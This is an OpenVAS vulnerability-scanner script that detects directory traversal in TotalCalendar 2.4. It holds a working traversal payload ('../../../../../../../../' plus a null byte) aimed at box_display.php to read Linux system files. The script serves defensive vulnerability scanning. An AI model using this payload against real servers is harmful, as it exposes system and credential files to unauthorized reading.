##############################################################################
# OpenVAS Vulnerability Test
#
# TotalCalendar SQL Injection and Directory Traversal Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902225");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2010-08-02 12:38:17 +0200 (Mon, 02 Aug 2010)");
  script_cve_id("CVE-2009-4973", "CVE-2009-4974");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("TotalCalendar SQL Injection and Directory Traversal Vulnerabilities");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9524");
  script_xref(name:"URL", value:"http://en.securitylab.ru/nvd/396246.php");
  script_xref(name:"URL", value:"http://en.securitylab.ru/nvd/396247.php");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Host/runs_unixoide");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"The flaw exists due to:

  - An improper validation of user supplied data to 'selectedCal' parameter
  in a 'SwitchCal' action within the 'modfile.php' script.

  - An improper validation of user supplied data to 'box' parameter to script
 'box_display.php'.");

  script_tag(name:"solution", value:"Upgrade to version 2.403 or later.");

  script_tag(name:"summary", value:"This host is running TotalCalendar and is prone to SQL injection
  and directory traversal vulnerabilities.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code and manipulate SQL queries by injecting
  arbitrary SQL code in a user's browser session in context of an affected site.");

  script_tag(name:"affected", value:"TotalCalendar version 2.4");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

foreach dir (make_list_unique("/projects/TotalCalendar", "/TotalCalendar", "/", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item: dir + "/index.php", port:port);

  if("Event calendar powered by TotalCalendar>" >< res)
  {
    files = traversal_files("linux");
    foreach pattern(keys(files)) {
      file = files[pattern];
      url = string(dir, "/box_display.php?box=../../../../../../../../" + file + "%00.htm");
      req = http_get(item:url, port:port);
      res = http_keepalive_send_recv(port:port, data:req);

      if(egrep(string:res, pattern:pattern, icase:TRUE))
      {
        report = http_report_vuln_url(port:port, url:url);
        security_message(data:report, port:port);
        exit(0);
      }
    }
  }
}

exit(99);
